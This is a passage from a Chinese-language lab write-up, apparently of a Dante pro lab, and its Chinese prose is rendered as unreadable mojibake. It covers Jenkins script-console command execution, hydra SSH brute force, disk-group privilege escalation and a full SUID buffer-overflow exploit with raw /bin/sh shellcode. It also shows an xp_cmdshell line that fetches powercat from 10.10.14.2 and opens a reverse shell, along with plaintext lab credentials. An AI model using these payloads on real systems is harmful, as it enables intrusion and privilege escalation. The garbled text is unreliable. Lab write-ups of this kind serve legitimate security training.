src="https://pic.imgdb.cn/item/64627c730d2dde5777ebf3f8.jpg"></a></p><p>ä¹Ÿå¯ä»¥é€šè¿‡msfçš„psexecæ¨¡å—æ¥è¿”å›ä¸€ä¸ªmeterpreterï¼š</p><p><a href="https://pic.imgdb.cn/item/64627dff0d2dde5777ed71af.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/64627dff0d2dde5777ed71af.jpg"></a></p><p>ä¹‹åæˆ‘ä»¬ä¸Šä¼ chiselï¼Œåˆ›å»ºä¸€æ¡ä»£ç†ï¼š</p><p><a href="https://pic.imgdb.cn/item/64627e260d2dde5777ed8a8f.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/64627e260d2dde5777ed8a8f.jpg"></a></p><p>åœ¨C:\Users\Administrator\Documentsç›®å½•å¤„å­˜åœ¨ä¸€ä¸ªJenkins.batæ–‡ä»¶ï¼Œå†…å®¹ä¸ºï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net user Admin_129834765 SamsungOctober102030 /add</span><br></pre></td></tr></table></figure><h3 id="Weâ€™re-going-in-circles"><a href="#Weâ€™re-going-in-circles" class="headerlink" title="Weâ€™re going in circles"></a>Weâ€™re going in circles</h3><p>åœ¨172.16.1.19çš„8080ç«¯å£ä¸Šè¿è¡Œç€JenkinsæœåŠ¡ï¼Œåˆ©ç”¨å¯†ç å¯ä»¥æˆåŠŸç™»å½•ï¼š</p><p><a href="https://pic.imgdb.cn/item/6462803c0d2dde5777eecc0b.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/6462803c0d2dde5777eecc0b.jpg"></a></p><p>æ¥ç€æˆ‘ä»¬è¿›å…¥&#x2F;scriptç›®å½•ï¼Œåˆ©ç”¨ä»¥ä¸‹è¯­å¥è¿›è¡Œå‘½ä»¤æ‰§è¡Œï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">println &quot;ls -al&quot;.execute().text</span><br></pre></td></tr></table></figure><p>ä¹‹åæ‹¿åˆ°meterpreterï¼Œæ­¤æ—¶ç”¨æˆ·ä¸ºjenkins:</p><p><a href="https://pic.imgdb.cn/item/6462819a0d2dde5777eff151.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/6462819a0d2dde5777eff151.jpg"></a></p><p>ä¹‹åä¸Šä¼ pspyå‘ç°ä»¥ä¸‹è¿›ç¨‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">2023/05/13 10:23:01 CMD: UID=0    PID=12129  | /bin/sh -c /bin/bash mysql -u ian -p VPN123ZXC</span><br></pre></td></tr></table></figure><p>å¾—åˆ°ä¸€ç»„å¸å·å¯†ç ï¼š<code>ian:VPN123ZXC</code>ï¼Œç›´æ¥suåˆ‡æ¢è‡³ianç”¨æˆ·ï¼Œå‘ç°åœ¨diskç»„é‡Œï¼š</p><p><a href="https://pic.imgdb.cn/item/646282340d2dde5777f098c5.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/646282340d2dde5777f098c5.jpg"></a></p><p>hacktricksé‡Œå¯¹diskç»„ææƒçš„æ–¹æ³•è¿›è¡Œäº†ä»‹ç»ï¼š<a href="https://book.hacktricks.xyz/linux-hardening/privilege-escalation/interesting-groups-linux-pe#disk-group">https://book.hacktricks.xyz/linux-hardening/privilege-escalation/interesting-groups-linux-pe#disk-group</a> é¦–å…ˆæˆ‘ä»¬çœ‹çœ‹&#x2F;devè®¾å¤‡é‡Œæœ‰å“ªäº›æ‰€å±ç»„æ˜¯diskï¼š</p><p><a href="https://pic.imgdb.cn/item/6462831f0d2dde5777f12980.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/6462831f0d2dde5777f12980.jpg"></a></p><p>ä¹‹åæ‰§è¡Œ<code>df -h</code>çœ‹çœ‹æ ¹ç›®å½•è¢«æŒ‚è½½åˆ°äº†å“ªé‡Œï¼š</p><p><a href="https://pic.imgdb.cn/item/6462835e0d2dde5777f14d65.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/6462835e0d2dde5777f14d65.jpg"></a></p><p>æ ¹ç›®å½•è¢«æŒ‚åœ¨åˆ°äº†&#x2F;dev&#x2F;sda5ï¼Œä¹‹åå°±ä¸hacktricksä¸­ä»‹ç»çš„æ–¹æ³•ç±»ä¼¼äº†ï¼š</p><p><a href="https://pic.imgdb.cn/item/6462b1330d2dde577712466e.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/6462b1330d2dde577712466e.jpg"></a></p><h3 id="My-cup-runneth-over"><a href="#My-cup-runneth-over" class="headerlink" title="My cup runneth over"></a>My cup runneth over</h3><p>æ¥ä¸‹æ¥æˆ‘ä»¬åœ¨DC02ä¸­æ‰§è¡Œå¦‚ä¸‹cmdå‘½ä»¤æ¥æ¢æµ‹172.16.2.0&#x2F;24ç½‘æ®µçš„å­˜æ´»ä¸»æœºï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(for /L %a IN (1,1,254) DO ping /n 1 /w 1 172.16.2.%a) | find &quot;Reply&quot;</span><br></pre></td></tr></table></figure><p>ç»“æœä¸ºï¼š</p><p><a href="https://pic.imgdb.cn/item/646285760d2dde5777f2881f.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/646285760d2dde5777f2881f.jpg"></a></p><p>è¯¥ç½‘æ®µè¿˜å­˜åœ¨ä¸€ä¸ªIPä¸º172.16.2.101çš„ä¸»æœºï¼Œä½¿ç”¨auxiliary&#x2F;scanner&#x2F;portscan&#x2F;tcpæ¨¡å—æ¢æµ‹ä¸€ä¸‹å¼€æ”¾çš„ç«¯å£ï¼Œå‘ç°å¼€æ”¾äº†22ç«¯å£ã€‚æˆ‘ä»¬å°†22ç«¯å£è½¬å‘åˆ°æœ¬åœ°ï¼š</p><p><a href="https://pic.imgdb.cn/item/64628cbd0d2dde5777f8b156.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/64628cbd0d2dde5777f8b156.jpg"></a></p><p>å°è¯•çˆ†ç ´ä¸€ä¸‹sshå¸å·å’Œå¯†ç ï¼Œç”¨æˆ·åå­—å…¸å’Œå¯†ç å­—å…¸éƒ½æ˜¯ä»ä¹‹å‰çš„excelæ–‡ä»¶ä¸­å¾—åˆ°çš„ã€‚è¿˜è®°å¾—æˆ‘ä»¬ä¹‹å‰çˆ†ç ´å¾—å‡ºçš„<code>julian:manchesterunited</code>è¿™å¯¹å¸å·å¯†ç å—ï¼Ÿæˆ‘ä»¬å°†å®ƒä¸€èµ·æ·»åŠ è¿›å­—å…¸ä¸­ï¼Œä½¿ç”¨hydraçˆ†ç ´ï¼Œç»“æœæ­£æ˜¯ä¹‹å‰å¾—åˆ°çš„julianï¼š</p><p><a href="https://pic.imgdb.cn/item/64628c9b0d2dde5777f89d31.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/64628c9b0d2dde5777f89d31.jpg"></a></p><p>æ¥ç€ç”¨sshç™»å½•åï¼Œå°è¯•SUIDææƒï¼š</p><p><a href="https://pic.imgdb.cn/item/64628ed70d2dde5777f9941c.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/64628ed70d2dde5777f9941c.jpg"></a></p><p>å‘ç°&#x2F;usr&#x2F;sbin&#x2F;readfileè¢«è®¾ç½®äº†SUIDä½ï¼Œå¤åˆ¶åˆ°æœ¬åœ°ï¼Œåˆ©ç”¨<a href="https://dogbolt.org/">https://dogbolt.org/</a> åœ¨çº¿åç¼–è¯‘ç«™ç‚¹å¯¹è¿™ä¸ªäºŒè¿›åˆ¶æ–‡ä»¶è¿›è¡Œåç¼–è¯‘ï¼Œè§‚å¯ŸGhidraæ¨¡å—ï¼Œå…¶ä¸­ä¸»å‡½æ•°å¦‚ä¸‹æ‰€ç¤ºï¼š</p><p><a href="https://pic.imgdb.cn/item/64628fa00d2dde5777fa2cf1.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/64628fa00d2dde5777fa2cf1.jpg"></a></p><p>é¦–å…ˆåˆ¤æ–­æˆ‘ä»¬æ˜¯å¦ä¼ å…¥äº†å‚æ•°ï¼Œå¦‚æœæ²¡æœ‰åˆ™è¾“å‡º<code>&quot;Syntax: %s &lt;/path/to/file&gt;\n</code>ã€‚å¦åˆ™ï¼Œå°±å°†çœŸå®ã€æœ‰æ•ˆä¸”å·²ä¿å­˜çš„ç”¨æˆ·æˆ–ç»„IDè®¾ç½®ä¸ºrootã€‚æ¥ä¸‹æ¥è¿˜è°ƒç”¨äº†strcpy()å‡½æ•°ï¼Œå°†ç”¨æˆ·è¾“å…¥param2å¤åˆ¶åˆ°local_58ç¼“å†²åŒºã€‚local_58ç¼“å†²åŒºé•¿åº¦ä¸º80,å¦‚æœè¶…è¿‡80,åˆ™ä¼šå¯¼è‡´ç¼“å†²åŒºæº¢å‡ºï¼Œå¹¶ä¸”å¯ä»¥ç”¨æ¥è·å¾—ä¸»æœºä¸Šçš„rootè®¿é—®æƒé™ã€‚ æ¥ä¸‹æ¥æˆ‘ä»¬æ‰§è¡Œgdb readfileï¼Œgdbè¿˜å®‰è£…äº†pedaæ’ä»¶ï¼Œæ‰§è¡Œchecksecæ£€æŸ¥äºŒè¿›åˆ¶çš„å„ç§å®‰å…¨é€‰é¡¹ï¼š</p><p><a href="https://pic.imgdb.cn/item/646291440d2dde5777fb2fe8.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/646291440d2dde5777fb2fe8.jpg"></a></p><p>ä¹‹åï¼Œæˆ‘ä»¬æ£€æŸ¥ASLRï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /proc/sys/kernel/randomize_va_space</span><br></pre></td></tr></table></figure><p><a href="https://pic.imgdb.cn/item/646291d70d2dde5777fb773e.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/646291d70d2dde5777fb773e.jpg"></a></p><p>å¯ä»¥çœ‹åˆ°ï¼ŒASLRè¢«å…³é—­ã€‚ä½¿ç”¨gdbï¼Œæˆ‘ä»¬ç”Ÿæˆä¸€ä¸ª100å­—èŠ‚çš„æ¨¡å¼ï¼Œå¹¶ä½¿ç”¨rå‚æ•°è¿è¡Œç¨‹åºï¼š</p><p><a href="https://pic.imgdb.cn/item/646292c90d2dde5777fbe1e7.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/646292c90d2dde5777fbe1e7.jpg"></a></p><p>å¯ä»¥çœ‹åˆ°RSPæŒ‡å‘æˆ‘ä»¬æœ‰æ•ˆè½½è·çš„ä¸€éƒ¨åˆ†ï¼ˆAAKAAgAA6AALï¼‰ã€‚æˆ‘ä»¬æœç´¢è¿™ä¸ªåç§»é‡åœ¨å“ªé‡Œ</p><p><a href="https://pic.imgdb.cn/item/6462933e0d2dde5777fc0edf.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/6462933e0d2dde5777fc0edf.jpg"></a></p><p>åç§»é‡æ˜¯88ï¼Œå› æ­¤æˆ‘ä»¬ç”¨pythonç”Ÿæˆ88ä¸ªâ€™Aâ€™å’Œ8ä¸ªâ€™Bâ€™ï¼š</p><p><a href="https://pic.imgdb.cn/item/646293b40d2dde5777fc42c9.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/646293b40d2dde5777fc42c9.jpg"></a></p><p>å¯ä»¥çœ‹åˆ°RSPè¢«8ä¸ªâ€™Bâ€™ç»™å¡«æ»¡ã€‚æˆ‘ä»¬å¯ä»¥æŠŠBæ›¿æ¢ä¸ºæˆ‘ä»¬shellcodeçš„åœ°å€ã€‚64ä½çš„shellcodeå¯ä»¥ä»<a href="http://shell-storm.org/shellcode/files/shellcode-806.html">è¿™é‡Œ</a>è°ƒç”¨&#x2F;bin&#x2F;shï¼Œå…¶ä¸­â€\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05â€ä¸€å…±æ˜¯27ä¸ªbyteï¼Œæ¥ç€æˆ‘ä»¬æ‰§è¡Œä¸‹é¢çš„ä»£ç ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">r $(python2 -c &#x27;print &quot;\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05&quot; + &quot;A&quot;*(88-27) + &quot;B&quot;*6&#x27;)</span><br></pre></td></tr></table></figure><p><a href="https://pic.imgdb.cn/item/646295d90d2dde5777fd1790.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/646295d90d2dde5777fd1790.jpg"></a></p><p>æˆ‘ä»¬å°†ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤åˆ†æå †æ ˆçš„å‰120ä¸ªå­—èŠ‚ï¼š</p><p><a href="https://pic.imgdb.cn/item/646296620d2dde5777fd792c.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/646296620d2dde5777fd792c.jpg"></a></p><p>æ²¡æ‰¾åˆ°shellcodeï¼Œå¯ä»¥é€šè¿‡åˆ é™¤200ä¸ªå­—èŠ‚æ¥åˆ†æRSPä¹‹å‰çš„å†…å­˜å†…å®¹ï¼š</p><p><a href="https://pic.imgdb.cn/item/646297210d2dde5777fe402c.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/646297210d2dde5777fe402c.jpg"></a></p><p>æ­¤æ—¶æ‰¾åˆ°äº†shellcodeã€‚shellcodeå‡ºç°åœ¨å†…å­˜è¡¨ç¤ºä¸­çš„ç¬¬äºŒä¸ªå…«ä½å­—èŠ‚ä¸­ã€‚ä¸‹ä¸€ä¸ªåœ°å€æ˜¯0x7fffffffe378ã€‚æˆ‘ä»¬å¯ä»¥é€šè¿‡ä»ä¸‹ä¸€ä¸ªå­—èŠ‚ä¸­åˆ é™¤8ä¸ªå­—èŠ‚æ¥è®¡ç®—shellcodeåœ°å€ï¼Œ0x7fffffffe370ã€‚ä¹‹åæˆ‘ä»¬ç”¨è¿™ä¸ªåœ°å€æ¥ä»£æ›¿è¿™äº›â€™Bâ€™ï¼š</p><p><a href="https://pic.imgdb.cn/item/646298550d2dde5777ffdf7c.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/646298550d2dde5777ffdf7c.jpg"></a></p><p>å¯ä»¥çœ‹åˆ°å·²ç»æˆåŠŸè¿›å…¥shelläº†ï¼Œå¯æ˜¯æ‰§è¡Œidä¹‹åå‘ç°æ˜¯julianï¼š</p><p><a href="https://pic.imgdb.cn/item/646298ae0d2dde57770088c2.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/646298ae0d2dde57770088c2.jpg"></a></p><p>è¿™å¾ˆæ­£å¸¸ï¼Œå› ä¸ºgdbè°ƒè¯•äºŒè¿›åˆ¶æ–‡ä»¶çš„æ—¶å€™ä¸ä¼šæå‡æƒé™ã€‚æ¥ç€æˆ‘ä»¬æ‰§è¡Œ<code>/usr/sbin/readfile $(python2 -c &#39;print &quot;\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05&quot; + &quot;A&quot;*(88-27) + &quot;\x70\xe3\xff\xff\xff\x7f&quot;&#39;)</code>ï¼Œç»“æœä¸ºï¼š</p><p><a href="https://pic.imgdb.cn/item/6462998b0d2dde5777016720.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/6462998b0d2dde5777016720.jpg"></a></p><p>è¿™é‡Œçš„åŸå› æ˜¯gdbåœ¨å †æ ˆä¸­ä¿ç•™äº†ä¸€äº›ç¯å¢ƒå˜é‡ï¼Œå› æ­¤æˆ‘ä»¬çš„shellcodeåœ¨æœ‰gdbå’Œæ²¡æœ‰gdbçš„æƒ…å†µä¸‹æœ‰ä¸åŒçš„åœ°å€ã€‚ æˆ‘ä»¬å¯ä»¥é€šè¿‡å°†å¤–å£³ä»£ç å­˜å‚¨åœ¨envå˜é‡ä¸­æ¥æ‰§è¡Œç›¸åŒçš„æ”»å‡»ï¼Œç„¶åå¯ä»¥æŒ‡å‘å †æ ˆåˆ°æ­¤å˜é‡çš„åœ°å€ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">export SHELLCODE=`python2 -c &#x27;print&quot;\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05&quot;&#x27;`</span><br></pre></td></tr></table></figure><p>SHELLCODEå˜é‡çš„åœ°å€å¯ä»¥é€šè¿‡ä»¥ä¸‹ä»£ç è·å¾—ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line">    </span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span> &#123;</span><br><span class="line">  <span class="type">char</span> *ptr;</span><br><span class="line">    </span><br><span class="line">  <span class="keyword">if</span>(argc &lt; <span class="number">3</span>) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Usage: %s &lt;environment variable&gt; &lt;target program name&gt;\n&quot;</span>, argv[<span class="number">0</span>]);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  ptr = getenv(argv[<span class="number">1</span>]); <span class="comment">/* get env var location */</span></span><br><span class="line">  ptr += (<span class="built_in">strlen</span>(argv[<span class="number">0</span>]) - <span class="built_in">strlen</span>(argv[<span class="number">2</span>]))*<span class="number">2</span>; <span class="comment">/* adjust for program name */</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%s will be at %p\n&quot;</span>, argv[<span class="number">1</span>], ptr);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä¹‹åæˆ‘ä»¬ç¼–è¯‘ä¸Šé¢è¿™æ®µä»£ç å¹¶è¿è¡Œç”Ÿäº§çš„äºŒè¿›åˆ¶æ–‡ä»¶ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc getenv.c -o getenv &amp;&amp; <span class="built_in">chmod</span> +x getenv &amp;&amp; ./getenv SHELLCODE /usr/sbin/readfile</span><br></pre></td></tr></table></figure><p><a href="https://pic.imgdb.cn/item/64629b310d2dde577702312a.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/64629b310d2dde577702312a.jpg"></a></p><p>æœ€åæˆ‘ä»¬è°ƒæ•´è°ƒç”¨ï¼Œè¿™æ¬¡ä½¿ç”¨äº†æ–°åœ°å€ï¼ŒæˆåŠŸgetrootï¼š</p><p><a href="https://pic.imgdb.cn/item/6462b1730d2dde5777126ddf.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/6462b1730d2dde5777126ddf.jpg"></a></p><h3 id="What-do-we-have-here"><a href="#What-do-we-have-here" class="headerlink" title="What do we have here?!"></a>What do we have here?!</h3><p>æ¥ç€æˆ‘ä»¬å†åœ¨è¿™å°æœºå­ä¸Šé€šè¿‡ä»¥ä¸‹å‘½ä»¤æ¥æŸ¥çœ‹å­˜æ´»ä¸»æœºï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">for i in &#123;1..255&#125; ;do (ping -c 1 172.16.2.$i | grep &quot;bytes from&quot;|cut -d &#x27; &#x27; -f4|tr -d &#x27;:&#x27; &amp;);done</span><br></pre></td></tr></table></figure><p><a href="https://pic.imgdb.cn/item/64629c580d2dde577702b8d4.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/64629c580d2dde577702b8d4.jpg"></a></p><p>æ‰¾åˆ°äº†ä¸€å°æ–°æœºå­ï¼ŒIPä¸º172.16.2.6ã€‚é€šè¿‡æ‰«æç«¯å£ï¼Œå‘ç°å¼€å¯äº†22ç«¯å£å’Œ631ç«¯å£ï¼Œæˆ‘ä»¬å†æ¬¡ä½¿ç”¨juliançš„å¸å·è¿ä¸Šå»ï¼Œå¯ä»¥ç›´æ¥æ‹¿åˆ°flagï¼š</p><p><a href="https://pic.imgdb.cn/item/6462b1930d2dde57771285b7.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/6462b1930d2dde57771285b7.jpg"></a></p><p>æ¥ç€æˆ‘ä»¬åœ¨Desktopç›®å½•ä¸‹æ‰¾åˆ°ä¸€ä¸ªSQLæ–‡ä»¶ï¼Œæ–‡ä»¶å†…å®¹ä¸ºï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">julian@DANTE-ADMIN-NIX06:~/Desktop$ cat SQL</span><br><span class="line">Hi Julian</span><br><span class="line">I&#x27;ve put this on your personal desktop as its probably the most secure </span><br><span class="line">place on the network!</span><br><span class="line"></span><br><span class="line">Can you please ask Sophie to change her SQL password when she logs in</span><br><span class="line">again? I&#x27;ve reset it to TerrorInflictPurpleDirt996655 as it stands, but</span><br><span class="line">obviously this is a tough one to remember</span><br><span class="line"></span><br><span class="line">Maybe we should all get password managers?</span><br><span class="line"></span><br><span class="line">Thanks,</span><br><span class="line">James</span><br></pre></td></tr></table></figure><p>å¾—åˆ°ä¸€ç»„å¸å·å¯†ç <code>sophie:TerrorInflictPurpleDirt996655</code>ã€‚</p><h3 id="It-doesnâ€™t-get-any-easier-than-this"><a href="#It-doesnâ€™t-get-any-easier-than-this" class="headerlink" title="It doesnâ€™t get any easier than this"></a>It doesnâ€™t get any easier than this</h3><p>ä¹‹åè¿˜å¯ä»¥åœ¨homeç›®å½•ä¸‹æ‰¾åˆ°ä¸€ä¸ªåä¸ºplongbottomçš„ç”¨æˆ·ï¼Œè€Œè¿™ä¸ªç”¨æˆ·ä¹Ÿæ­£å¥½åœ¨æˆ‘ä»¬ä¹‹å‰å¾—åˆ°çš„é‚£ä¸ªexcelæ–‡ä»¶é‡Œã€‚å› æ­¤æˆ‘ä»¬ç›´æ¥suåˆ‡æ¢è‡³è¯¥ç”¨æˆ·ã€‚ä¹‹åæ‰§è¡Œsudo -låï¼Œå‘ç°å¯ä»¥sudoæ‰§è¡Œä»»ä½•å‘½ä»¤ï¼Œé‚£ç›´æ¥sudoå»çœ‹rootç›®å½•ä¸‹çš„flagå³å¯ï¼š</p><p><a href="https://pic.imgdb.cn/item/64629de90d2dde577703bf5e.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/64629de90d2dde577703bf5e.jpg"></a></p><h3 id="Fail-2-The-Sequel"><a href="#Fail-2-The-Sequel" class="headerlink" title="Fail 2: The Sequel"></a>Fail 2: The Sequel</h3><p>æ¥ä¸‹æ¥ï¼Œæˆ‘ä»¬å›è¿‡å¤´æ¥çœ‹172.16.1.5è¿™å°æœºå­ï¼Œä¹‹å‰å› ä¸ºæ²¡æœ‰çº¿ç´¢è€Œå°†å®ƒæš‚æ—¶æç½®äº†ã€‚ç°åœ¨æˆ‘ä»¬æ‹¿åˆ°äº†sophieçš„å¸å·å¯†ç ï¼Œå¯ä»¥å°è¯•ç™»å½•ä¸€ä¸‹äº†ã€‚åˆ©ç”¨impacketä¸­çš„mssqlclientå¯ä»¥è¿›è¡Œç™»å½•ï¼š</p><p><a href="https://pic.imgdb.cn/item/64629e810d2dde5777041141.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/64629e810d2dde5777041141.jpg"></a></p><p>æ¥ç€å¼€å§‹ææƒï¼Œé¦–å…ˆæ‰§è¡Œ<code>select is_srvrolemember(&#39;sysadmin&#39;);</code>åˆ¤æ–­å½“å‰æ˜¯å¦ä¸ºDBAæƒé™ï¼Œä¸º1åˆ™å¯ä»¥ææƒï¼š</p><p><a href="https://pic.imgdb.cn/item/64629edc0d2dde57770439c4.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/64629edc0d2dde57770439c4.jpg"></a></p><p>æ¥ç€æˆ‘ä»¬ æŸ¥çœ‹èƒ½å¦ä½¿ç”¨ xp_cmdshellï¼Œä»MSSQL2005ç‰ˆæœ¬ä¹‹åé»˜è®¤å…³é—­ï¼š <code>select count(*) from master.dbo.sysobjects where xtype = &#39;x&#39; and name = &#39;xp_cmdshell&#39;</code></p><p><a href="https://pic.imgdb.cn/item/64629f180d2dde5777045812.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/64629f180d2dde5777045812.jpg"></a></p><p>å¯ä»¥ä½¿ç”¨xp_cmdshellï¼Œæˆ‘è¿™é‡Œä½¿ç”¨powercatæ¥åå¼¹shellï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xp_cmdshell &quot;powershell IEX (New-Object Net.WebClient).DownloadString(\&quot;http://10.10.14.2:1241/powercat.ps1\&quot;);powercat -c 10.10.14.2 -p 1242 -e cmd&quot;</span><br></pre></td></tr></table></figure><p><a href="https://pic.imgdb.cn/item/6462a06c0d2dde577704feac.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/6462a06c0d2dde577704feac.jpg"></a></p><p>åœ¨C:\DB_backupsç›®å½•ä¸‹å‘ç°ä¸€ä¸ªåå«db_backup.ps1çš„æ–‡ä»¶ï¼Œå°è¯•è¯»å–ï¼š</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">db_backup.ps1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># Work in progress database backup script. Adapting from mysql backup script. Does not work yet. Do not use.</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$password</span> = <span class="string">&#x27;Alltheleavesarebrown1&#x27;</span></span><br><span class="line"><span class="variable">$user</span> = <span class="string">&#x27;sophie&#x27;</span></span><br><span class="line"><span class="variable">$cred</span> = <span class="built_in">New-Object</span> System.Net.NetworkCredential(<span class="variable">$user</span>, <span class="variable">$password</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="variable">$date</span> = <span class="built_in">Get-Date</span></span><br><span class="line"><span class="variable">$dateString</span> = <span class="variable">$date</span>.Year.ToString() + <span class="string">&quot;-&quot;</span> + <span class="variable">$date</span>.Month.ToString() + <span class="string">&quot;-&quot;</span> + <span class="variable">$date</span>.Day.ToString()</span><br><span class="line"></span><br><span class="line"><span class="comment">#Create symbolic link for sqldump.exe in the script folder</span></span><br><span class="line"><span class="variable">$sqldumpLocation</span> = \.sqldump.exe</span><br><span class="line"><span class="variable">$backupDest</span> = C:\DB_backups\SQL\sql_backup_<span class="string">&quot;+ <span class="variable">$dateString</span> + &quot;</span>.sql<span class="string">&quot;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"><span class="variable">$execute_sqldump</span> = <span class="variable">$sqldumpLocation</span>+&quot;</span> <span class="literal">-u</span><span class="string">&quot;+<span class="variable">$cred</span>.UserName+&quot;</span> <span class="literal">-p</span><span class="string">&quot;+<span class="variable">$cred</span>.Password +&quot;</span> &gt; <span class="string">&quot; + <span class="variable">$backupDest</span></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">invoke-expression <span class="variable">$execute_sqldump</span></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># use 7zip to compress and encrypt the backup with same password as used to autheticate the sql backup user</span></span><br><span class="line"><span class="string"># removes the unencrypted .sql file afterwards</span></span><br><span class="line"><span class="string"># create symbolic link for 7z.exe in the script folder</span></span><br><span class="line"><span class="string"><span class="variable">$sevenzip</span> = &quot;</span>.<span class="comment">#7z.exe&quot;</span></span><br><span class="line"><span 